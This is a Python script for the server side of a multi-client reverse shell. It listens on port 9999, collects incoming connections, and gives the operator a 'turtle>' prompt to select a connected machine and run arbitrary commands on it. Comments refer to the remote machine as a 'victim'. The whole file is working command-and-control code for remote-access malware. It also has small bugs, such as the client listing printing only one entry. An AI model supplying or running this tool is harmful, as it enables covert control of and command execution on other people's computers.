import socket
import sys   # this library is used for command promt function in python file
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
all_connection=[]
all_address=[]
queue=Queue()

# Creates an socket(connecting two computers)
def create_socket():
    try:
        global host   # global declaration of ip address
        global port   # port number
        global s      # socket
        host=""
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

# Binding the socket and listening for connection
def bind_socket():
    try:
        global host  # global declaration of ip address
        global port  # port number
        global s  # socket
        print("Binding the Socket at Port "+str(port))

        s.bind((host,port)) # This consist of a tuple which binds the IP address and Port
        s.listen(5)         # The maximum length of the pending connections queue (no. of bad connection)
    except socket.error as msg:
        print("Socket Binding error: "+str(msg) + "\n" +"Retrying...")
        bind_socket()      # RECURSION: A function call itself in side a same function

# Handling connections from multiple clients and save into list
# closing previous connection when server_multiple_client.py is restarted

def accepting_connection():
    for i in all_connection:
        i.close()
    del all_connection[:]
    del all_address[:]
    try:
        while True:
            conn,address=s.accept()
            s.setblocking(1)  # prevents timeout
            all_address.append(address)
            all_connection.append(conn)
            print("Connection has been establish! " + address[0])
    except:
        print("Error accepting Connection!")

# 2nd Thread Functions - 1. See all the Clients  2. Select a Client  3. Send command to selected Client
# Interactive shell for sending Commands
# turtle> list
# 1 Friend-A Port (ID IP Address Port)
# 2 Friend-B Port
# 3 Friend-C Port
# 192.168.43.199> dir

def start_turtle():     # Intereactive shell is started
    while True:
        cmd = input("turtle> ")
        if cmd=="list":
            list_connections()
        elif "select" in cmd:
            conn=get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else:
            print("Command is not Recognised!")

# display all the current active client connection

def list_connections():
    results=""
    for i,conn in enumerate(all_connection):

        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        result = str(i) + "  " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
    print("-------Clients-------" + "\n" + result)

# selecting a target
def get_target(cmd):
    try:
        target=cmd.replace("select ","")
        target=int(target)
        conn=all_connection[target]
        print("You are now connected to " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">" , end ="")
        return conn
    # 192.168.43.199> dir
    except:
        print("Selection is not valid")
        return None

# send commands to client/victim or a friend
def send_target_command(conn):
    while True:
        try:
            cmd = input()  # Taking input from the user same as command promt
            if cmd=="quit":
                break
            if len(str.encode(cmd))>0:     # all the cmd are in the byte format so convert into string encode
                conn.send(str.encode(cmd)) # send the data to the client computer in string format
                client_response=str(conn.recv(20480),'utf-8')    # 20480 = buffer size and utf-8=(8-bit Unicode Transformation Format)
                print(client_response,end="")
        except:
            print("Error sending command!")
            break

# Create worker threads
def create_workers():
    for _ in range (NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon=True
        t.start()

# do next job that is in the queue(handles connection and send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connection()
        elif x==2:
            start_turtle()
        queue.task_done()

# creates jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
